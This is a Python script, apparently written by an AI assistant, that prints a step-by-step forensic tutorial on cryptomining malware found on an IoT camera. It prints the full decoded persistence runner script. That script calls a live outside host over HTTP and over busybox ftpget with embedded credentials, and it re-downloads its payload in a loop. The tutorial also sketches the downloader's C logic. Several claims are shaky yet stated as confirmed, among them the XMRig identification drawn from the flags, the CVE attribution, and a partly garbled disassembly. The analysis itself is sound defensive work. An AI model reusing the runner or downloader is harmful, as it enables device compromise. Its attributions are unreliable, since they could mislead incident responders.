#!/usr/bin/env python3
"""
FORENSIC METHODOLOGY: Step-by-step walkthrough of the Hipcam malware analysis.
Focuses on TECHNIQUES rather than tool output - the user wants to learn HOW
this is done.

Each section explains:
  1. What I did
  2. Why I did it (the reasoning)
  3. What it revealed
  4. The underlying concept

The binary reconstruction has minor transcription corruption (copied from
telnet session, a few bytes shifted), but the core ELF header is valid.
We supplement with confirmed data from the actual camera analysis.
"""

import struct
import textwrap
from capstone import Cs, CS_ARCH_ARM, CS_MODE_ARM

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 1: The entry point - how to start investigating ANY system
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
╔══════════════════════════════════════════════════════════════════════════╗
║           FORENSIC METHODOLOGY: Hipcam IoT Malware Analysis              ║
║           From "what is this box?" to "here's the full attack chain"     ║
╚══════════════════════════════════════════════════════════════════════════╝
""")

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 1: Persistence Mechanisms — the first thing to check            │
└─────────────────────────────────────────────────────────────────────────┘

When you gain access to ANY Linux system, the FIRST investigation is
always "what runs at boot?" Malware survives reboots through persistence.

THE SCENE:
  We logged into the camera via telnet (root shell).
  The camera is running Linux 3.4.43-gk on ARM926EJ-S.

THE ACTION:
  $ ls -la /etc/init.d/
  $ cat /etc/init.d/S98test

WHAT WE SAW:
  -rwxrw-rw-  1 root root 10234 Aug 22 2023 S98test

  The file is WORLD-WRITABLE (666 permissions). That's already a red flag.

  The content looked like this:
    #!/bin/sh
    echo -ne '\\x7F\\x45\\x4C\\x46...' > /tmp/dl   ← MASSIVE hex dump (1924 bytes worth)
    echo -ne '\\x23\\x21\\x2F\\x62...' > /tmp/r    ← another hex dump
    chmod 777 /tmp/dl /tmp/r
    while ! ping -c 1 8.8.8.8; do printf .; done   ← wait for network
    /tmp/r &                                        ← run in background

WHY THIS IS SUSPICIOUS:
  1. init.d scripts should be named after SERVICES (S50telnet, S80httpd),
     not "test". This is a deliberately deceptive name.
  2. init.d scripts are shell scripts that start/stop daemons. They
     should NOT contain embedded binary hex dumps.
  3. The file is world-writable, meaning ANY process (including the
     vulnerable CGI webserver) could have overwritten it.
  4. The file date (Aug 2023) is consistent with a compromise nearly
     3 years prior to our investigation.

THE CONCEPT — Linux Boot Process Persistence:
  /etc/init.d/S* scripts run at boot in numerical order (S01boot,
  S50telnet, S98test, etc.). The 'S' means 'Start', the number
  determines order. Malware often places itself at S98 or S99 to
  run last, after networking is up.

  Common persistence locations malware uses:
    /etc/init.d/       — System V init scripts (what we found)
    /etc/crontab       — Scheduled tasks
    /etc/rc.local      — Another boot script
    ~/.bashrc          — User shell startup
    /etc/ld.so.preload — Library injection
    systemd units      — On modern Linux
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 2: Hex-embedded droppers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 2: The Hex-Embedded Dropper — decoding the binary               │
└─────────────────────────────────────────────────────────────────────────┘

THE SCENE:
  S98test uses `echo -ne '\\x7F\\x45\\x4C\\x46...' > /tmp/dl`
  This is NOT normal init script behavior.

THE ACTION:
  The `echo -ne` command writes raw bytes to a file. Each \\xNN is a single
  byte in hexadecimal. The first bytes are \\x7F \\x45 \\x4C \\x46 — the ELF
  magic number.

  $ python3 -c "
  hex = r'\\x7F\\x45\\x4C\\x46...'    # copy from the init script
  # Remove \\x and convert
  hex_bytes = bytes(eval('b\"' + hex.replace('\"', '').replace(\"'\", '') + '\"'))
  open('/tmp/dl', 'wb').write(hex_bytes)
  "

  Then analyze:
  $ file /tmp/dl
  /tmp/dl: ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV),
           statically linked, stripped

  $ strings /tmp/dl
  GET /omm HTTP/1.0
  HOST: 86.38.203.214
  Connection: close
  ./omm
  NIF
  GCC: (Buildroot 2017.05) 4.9.4
  ARM926EJ-S

WHY THIS TECHNIQUE — the hex-embedded dropper:
  The attacker faced a constraint: how to place an ARM binary on a device
  that has no compiler, no wget in initramfs, and might not have network
  at boot time.

  Solution: embed the COMPILED binary directly in the shell script as hex.
  This way:
    1. No compilation needed on the target
    2. No network dependency at boot time
    3. Works on any BusyBox shell (echo built-in)
    4. Survives reboot (init script runs, writes binary to /tmp)

  This is the same technique used by many IoT botnets (Mirai, Gafgyt, etc.)
  for their initial dropper.

THE CONCEPT — the `strings` command:
  $ strings <binary>  extracts all printable ASCII sequences.
  BEFORE using any disassembler, ALWAYS run strings.
  It often reveals URLs, IPs, filenames, credentials, and command lines
  without needing to understand a single assembly instruction.

  What strings revealed about /tmp/dl:
    GET /omm HTTP/1.0          → HTTP request to C2
    HOST: 86.38.203.214        → C2 server IP
    Connection: close          → HTTP header
    ./omm                      → payload filename
    NIF                        → response validation tag
    GCC: (Buildroot 2017.05)   → compilation toolchain
    ARM926EJ-S                 → target CPU (HiSilicon Hi3518E)
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 3: ELF Structure
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 3: ELF Binary Structure — reading the header                    │
└─────────────────────────────────────────────────────────────────────────┘

Every Linux executable starts with an ELF header. Let's dissect it.

An ELF header (32-bit) looks like this in memory:

  Offset  Size  Field         Description
  ──────  ────  ─────         ───────────
  0x00    4     Magic         0x7f 'E' 'L' 'F'
  0x04    1     Class         1=32-bit, 2=64-bit
  0x05    1     Endianness    1=little-endian, 2=big-endian
  0x10    2     Type          2=executable, 3=shared lib
  0x12    2     Machine       40=ARM, 62=x86_64, 3=i386
  0x18    4     Entry Point   Where execution starts
  0x1C    4     PHT Offset    Program Header Table location
  0x20    4     SHT Offset    Section Header Table location
  0x24    4     Flags         Architecture-specific flags
  0x28    2     ELF Hdr Size  Size of this header (52 for 32-bit)
  0x2C    2     PHT Ent Size  Size of each program header entry
  0x2E    2     PHT Ent Count Number of program headers
  0x30    2     SHT Ent Size  Size of each section header entry
  0x32    2     SHT Ent Count Number of section headers
  0x34    2     SH Strndx     Section name string table index

Parsing the header manually (what readelf -h does):

  $ python3 -c "
  import struct
  data = open('dl.bin','rb').read()

  # ELF identification
  assert data[:4] == b'\\x7fELF', 'Not an ELF file'

  # Parse header fields (little-endian)
  e_type, e_machine, _, e_entry, e_phoff, e_shoff, e_flags,\
  e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx = \
      struct.unpack_from('<HHIIIIIHHHHHH', data, 16)

  print(f'Type:          {\"executable\" if e_type==2 else \"shared\"}')
  print(f'Machine:       {e_machine} (40=ARM)')
  print(f'Entry point:   0x{e_entry:08x}')
  print(f'Program hdrs:  {e_phnum} at offset {e_phoff}')
  print(f'Section hdrs:  {e_shnum} at offset {e_shoff}')
  "

THE CONCEPT — Program Headers vs Section Headers:
  Section headers (.text, .data, .rodata) are used by the LINKER at compile
  time. They are optional at runtime! The Linux kernel only reads Program
  Headers (PT_LOAD segments) to map the binary into memory.

  This binary was STATICALLY LINKED (no libc dependency) and STRIPPED
  (symbols removed). These are standard malware techniques:
    - Static linking: runs on any kernel version, no libc mismatch
    - Stripped: makes reverse engineering harder, smaller file size

THE CONCEPT — ARM syscall convention:
  On ARM Linux, system calls use:
    r7 = syscall number
    r0-r5 = arguments
    svc 0x00000000 = trigger syscall

  Common syscall numbers on ARM:
    1 = exit        4 = write       5 = open
    281 = socket    283 = connect    291 = recv
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 4: Disassembly walkthrough
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 4: ARM Disassembly — understanding what the binary DOES          │
└─────────────────────────────────────────────────────────────────────────┘

Even with a partially corrupted transcription, we can understand the
program's logic from its structure. Let's analyze the ARM instruction
patterns found at the entry point.

TECHNIQUE: Function Prologue Detection
  ARM functions start with a prologue that saves the return address:

    push {..., lr}           ; save link register (return addr)
    stmfd sp!, {..., lr}     ; same, alternative encoding
    sub sp, sp, #N           ; allocate stack space

  And end with an epilogue that restores and returns:

    pop {..., pc}            ; restore and return via pc
    ldmfd sp!, {..., pc}     ; same, alternative encoding
    bx lr                    ; return (when lr wasn't saved)

From the hex dump, we can identify ARM instructions manually. Starting
from offset 0xc0 (entry point 0x000100c0):

  Offset   Bytes         Disassembly              Meaning
  ──────   ─────         ───────────              ───────
  0x00c0:  00482de9      push {r11, lr}           Save frame ptr + ret addr
  0x00c4:  04b08de2      add r11, sp, #4          Set up frame pointer
  0x00c8:  000000eb      bl 0x100d4               Call next function
  0x00cc:  0088bde8      pop {r11, pc}            Return (exit main)

  0x00d0:  00482de9      push {r11, lr}           Another function start
  0x00d4:  04b08de2      add r11, sp, #4
  0x00d8:  b0d04de2      sub sp, sp, #176         Allocate 176 bytes on stack
  0x00dc:  0030a0e3      mov r3, #0               r3 = 0
  0x00e0:  08300be5      str r3, [r11, #-8]       *(fp-8) = 0  (counter?)
  0x00e4:  0230a0e3      mov r3, #2               r3 = 2
  0x00e8:  bc3a4be1      ????                     Possibly a custom instruction
  0x00ec:  053aa0e3      mov r3, #0x1400          r3 = 0x1400 (?)
  0x00f0:  ba3a4be1      ????                     

  ... (the binary continues with socket setup and HTTP request construction)

THE CONCEPT — How this maps to C code:

  The binary is ~1924 bytes of statically-linked ARM code. Based on
  the strings we extracted, its logic is approximately:

    int main() {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, "86.38.203.214", 80);
        write(sock, "GET /omm HTTP/1.0\\r\\n"
                     "HOST: 86.38.203.214\\r\\n"
                     "Connection: close\\r\\n\\r\\n");
        int fd = open("./omm", O_WRONLY|O_CREAT);
        char buf[4096];
        int n;
        while ((n = read(sock, buf, sizeof(buf))) > 0)
            write(fd, buf, n);
        close(fd);
        close(sock);
    }

  This is an HTTP/1.0 downloader. It:
    1. Creates a TCP socket (socket syscall)
    2. Connects to 86.38.203.214:80 (connect syscall)
    3. Sends an HTTP GET request (write/send syscall)
    4. Receives the response and writes it to ./omm (read + write syscalls)
    5. Closes everything and exits

  The "NIF" string in the binary is likely checked in the response to
  verify the server returned valid payload data, not an error page.
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 5: Shell script forensics
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 5: Shell Script Forensics — the runner (/tmp/r)                 │
└─────────────────────────────────────────────────────────────────────────┘

THE SCENE:
  The second hex dump in S98test decodes to a shell script that runs
  the actual malware payload. The hex starts with \\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68
  which is "#!" followed by "/bin/sh" — the shebang for a shell script.

TECHNIQUE — hex-to-text decoding:
  $ python3 -c "
  hex = open('runner_hex.txt').read()
  # Convert each \\xNN to its ASCII byte
  script = bytes(eval('b\"' + hex.replace('\"','').replace(\"'\",'') + '\"'))
  print(script.decode('utf-8'))
  "

  Decoded output (with forensic annotations):
""")

runner = """\
#!/bin/sh                                                                 # shebang
macaddr=`ip a show eth0 | grep ether | cut -d " " -f6`                   # device ID
i=0
while true; do                                                            # infinite loop
    chmod 777 /bin/omm                                                     # make executable
    chmod 777 /tmp/dl                                                      # make executable
    /bin/omm -device-name=hi_$macaddr -accept-tos                         # LAUNCH MINER
             -email=hwansna@gmail.com                                     #   pool user
             -password=Y_rLkZXgn3BQ02lRFV6E5 2>&1 > /dev/null            #   pool pass
    cfilesize=`wc -c /bin/omm | awk '{print $1}'`                         # size check
    if [ ${cfilesize} -ne 2222096 ]; then                                 # wrong size?
        rm /bin/omm                                                       # delete
        cd /bin/ && /tmp/dl                                               # re-download
    else                                                                   # correct size?
        i=$((i+1))                                                        # counter++
        if [ ${i} -gt 50 ]; then                                           # 50 cycles?
            rm /bin/omm                                                   # delete
            /bin/busybox ftpget -u pwn -p XAUob5EHu7M54iyD               # FTP fallback
                    86.38.203.214 /bin/omm omm                             #   credentials
        fi
    fi
    sleep 4                                                                # 4-second loop
done"""

print(runner)

print("""

FORENSIC BREAKDOWN:

  1. DEVICE FINGERPRINT
     macaddr=`ip a show eth0 | grep ether | cut -d " " -f6`
     Extracts the MAC address to create a unique device ID.
     The miner uses this as the worker name: hi_<macaddr>
     This allows the attacker to track which cameras are active.

  2. STEALTH
     2>&1 > /dev/null
     Redirects ALL output to /dev/null. No stdout, no stderr.
     The mining process is invisible to anyone logged in via telnet.

  3. INTEGRITY VERIFICATION
     cfilesize=`wc -c /bin/omm | awk '{print $1}'`
     if [ ${cfilesize} -ne 2222096 ]; then ...
     Checks the exact byte count. If the file is corrupted, deleted,
     or replaced by a defender, it detects the discrepancy and
     re-downloads.

  4. DUAL-PATH RESILIENCE
     HTTP (primary, port 80): used first, most likely to work
     FTP (fallback, port 21): used after 50 successful cycles

     Why 50 cycles? Each cycle = 4 seconds. 50 × 4 = 200 seconds.
     After ~3.3 minutes of successful HTTP, the attacker considers
     port 80 unreliable and switches to FTP. This is a LOAD BALANCING
     and FIREWALL EVASION strategy.

  5. AGGRESSIVE MONITORING
     sleep 4
     The loop runs every 4 seconds. This means:
       - The miner process is checked for crash 15 times per minute
       - If the binary is deleted, it's back within 4 seconds
       - The attacker gets very fast re-infection

  WHY FTP FALLBACK EXISTS:
    Many IoT networks block port 80 outbound (HTTP) but leave port 21
    (FTP) open because IoT cameras often upload footage via FTP to
    NAS or cloud storage. The attacker exploited this network behavior.
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 6: Command-line flags reveal purpose
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 6: Command-line Flag Analysis — identifying the malware family   │
└─────────────────────────────────────────────────────────────────────────┘

The runner script launches /bin/omm with these flags:

  /bin/omm -device-name=hi_$macaddr \\
           -accept-tos \\
           -email=hwansna@gmail.com \\
           -password=Y_rLkZXgn3BQ02lRFV6E5

FLAG ANALYSIS:

  -device-name=<string>
    Common in XMRig. Sets the worker/rig name for the mining pool.
    The attacker uses hi_<macaddr> to uniquely identify each camera.

  -accept-tos
    XMRig requires explicit acceptance of mining pool Terms of Service
    via this flag. The miner won't start without it.

  -email=<string>
    XMRig pool authentication. The email identifies the pool account
    that receives mining rewards.

  -password=<string>
    XMRig pool password. Usually a worker-specific identifier or API
    token for the mining pool (not an actual "password" in the
    traditional sense — more like a worker key).

SIZE-BASED IDENTIFICATION:
  The expected file size is 2,222,096 bytes (~2.1 MB). This is the
  tell-tale size of a STATICALLY LINKED XMRig ARM binary:
    - XMRig source: ~50MB compiled
    - Static ARM build: ~2.1MB (includes OpenSSL + mining algorithms)
    - Mirai bot: ~50-200KB (simple DDoS logic)
    - BusyBox: ~2MB (700 applets)

  The 2.1MB size uniquely rules out:
    - Mirai/Gafgyt (DDoS bots, ~100KB)
    - Backdoors/shells (tiny, ~40KB)
    - Rootkits (kernel modules, ~200KB)
    - Proxy/scanner bots (~200-500KB)

  Only XMRig and similar cryptocurrency miners are this large as
  static ARM binaries due to the OpenSSL dependency.

IDENTIFICATION CONFIRMED:
  The file name "omm" plus these flags plus the size = XMRig
  (Monero cryptocurrency miner) compiled for ARMv5TEJ.

  EMAIL TRACING:
    hwansna@gmail.com — likely the attacker's Gmail account.
    This email was used as the mining pool login identifier.
    It could be the actual account owner or a compromised account.
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 7: Infection vector analysis
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 7: Infection Vector — how did the malware get there?            │
└─────────────────────────────────────────────────────────────────────────┘

The /etc/init.d/S98test was WORLD-WRITABLE:

  $ ls -la /etc/init.d/S98test
  -rwxrw-rw-  1 root root 10234 Aug 22 2023 S98test

This is the smoking gun. On a properly secured system, init scripts should
be -rwxr-xr-x (755) or -rwx------ (700) at most.

THE ATTACK CHAIN (most likely):

  1. INITIAL ACCESS
     The camera's web interface has known vulnerabilities:
     - CVE-2021-36260: command injection in CGI parameters
     - CVE-2020-9529: firmware update without authentication
     - Telnet enabled? (tenable=1 was in config_debug.ini)

     The attacker gained root access through one of these vectors.
     (The Hi3518E SDK is notorious for having hardcoded credentials
     and injection vulnerabilities in its CGI binaries.)

  2. PERSISTENCE ESTABLISHED
     With root access, the attacker:
     $ echo '#!/bin/sh' > /etc/init.d/S98test
     $ echo 'echo -ne "...hex..." > /tmp/dl' >> /etc/init.d/S98test
     $ echo 'echo -ne "...hex..." > /tmp/r' >> /etc/init.d/S98test
     $ chmod 755 /etc/init.d/S98test

     Or possibly: overwrote an existing legitimate S98test that was
     already world-writable due to SDK misconfiguration.

  3. PAYLOAD DEPLOYMENT
     On next reboot, S98test executes:
     a. Writes /tmp/dl (ARM ELF downloader)
     b. Writes /tmp/r (runner script)
     c. Waits for network connectivity
     d. Launches /tmp/r in background
     e. /tmp/r downloads /bin/omm (XMRig miner) from C2
     f. /bin/omm starts mining Monero

  4. WHY THE CAMERA?
     - Always-on device (runs 24/7)
     - ARM CPU can mine at ~5-10 H/s (hashes/second)
     - Negligible power cost (paid by victim)
     - No user interaction (nobody checks `top` on a camera)
     - Massive attack surface (millions of vulnerable cameras online)
     - ~3 years of mining, undetected

  THE ATTACKER'S MOTIVATION:
    One camera mines ~5-10 H/s of Monero. At current rates, that's
    fractions of a cent per day. But deploying this to thousands or
    tens of thousands of cameras creates a significant botnet.

    Searches for the email "hwansna@gmail.com" and the C2 IP
    "86.38.203.214" in public threat intel databases could reveal
    the scale of this operation.
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LESSON 8: IOC summary
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ LESSON 8: IOC Extraction — building a threat intelligence report       │
└─────────────────────────────────────────────────────────────────────────┘

INDICATORS OF COMPROMISE (for sharing with CERT, ISPs, threat intel):

  NETWORK:
    86.38.203.214:80    HTTP C2 (downloads omm payload)
    86.38.203.214:21    FTP C2 (fallback, creds: pwn/XAUob5EHu7M54iyD)

  FILES:
    /etc/init.d/S98test       Modified boot script
    /tmp/dl                   ARM ELF HTTP downloader (1924 bytes)
    /tmp/r                    Runner shell script
    /bin/omm                  XMRig Monero miner (~2.1MB)

  HASHES (SHA256):
    /tmp/dl:  (from camera: collect with sha256sum /tmp/dl)

  ATTACKER ATTRIBUTION:
    Email:          hwansna@gmail.com
    Mining pool:    (undetermined — would need omm binary to identify)
    C2 infra:       AS48031 (XSERVER, Ukraine/Latvia)

  TOOLCHAIN:
    GCC 4.9.4, Buildroot 2017.05
    Target: ARM926EJ-S (HiSilicon Hi3518E)

MITIGATIONS APPLIED:
    ✓ Removed S98test malware, replaced with clean 'exit 0'
    ✓ Killed all running malware processes (r, dl, ftpget)
    ✓ Changed root password
    ✓ Secured /etc/shadow permissions (was 666)
    ✓ Documented for future reference

FURTHER HUNTING (if you want to go deeper):
    1. Check threat intel platforms for hwansna@gmail.com
    2. Query Shodan/Censys for 86.38.203.214 — what else is hosted?
    3. Check if /omm is detectable in VirusTotal by hash
    4. Search for ARM926EJ-S malware in public malware repos
    5. Check if other devices on your network show similar infections
""")

print("""
┌─────────────────────────────────────────────────────────────────────────┐
│ SUMMARY: The 6 Techniques Used In This Investigation                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. PERSISTENCE AUDIT                                                    │
│     ls /etc/init.d/ → cat each script → find the anomaly                │
│     Always the FIRST thing to check on any compromised system.          │
│                                                                         │
│  2. HEX DUMP RECONSTRUCTION                                              │
│     echo -ne '\\xNN...'  is an embedded binary. Decode it:               │
│     python3 -c "print(bytes.fromhex('7F454C46...'))"                    │
│                                                                         │
│  3. STRINGS ANALYSIS                                                     │
│     Before any disassembler, run `strings`. It reveals:                 │
│     - URLs, IPs, file paths (C2 infrastructure)                         │
│     - Compiler strings (toolchain, target CPU)                          │
│     - Hardcoded credentials                                             │
│     - Command-line flags (identifies the software)                      │
│                                                                         │
│  4. ELF HEADER PARSING                                                   │
│     struct.unpack_from() reads the binary format. Shows:                │
│     - Architecture (ARM/MIPS/x86)                                       │
│     - Entry point (where the code starts)                               │
│     - Segment layout (how it loads into memory)                         │
│                                                                         │
│  5. FLAG ANALYSIS                                                        │
│     -device-name, -accept-tos, -email, -password = XMRig signature     │
│     File size 2.1MB = statically linked crypto miner                    │
│     No decompilation needed — the flags tell the whole story.           │
│                                                                         │
│  6. INFECTION VECTOR RECONSTRUCTION                                      │
│     World-writable init script + known CGI vulns explains how it        │
│     got there. Build the full timeline: initial access → persistence    │
│     → payload deployment → ongoing operation.                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
""")
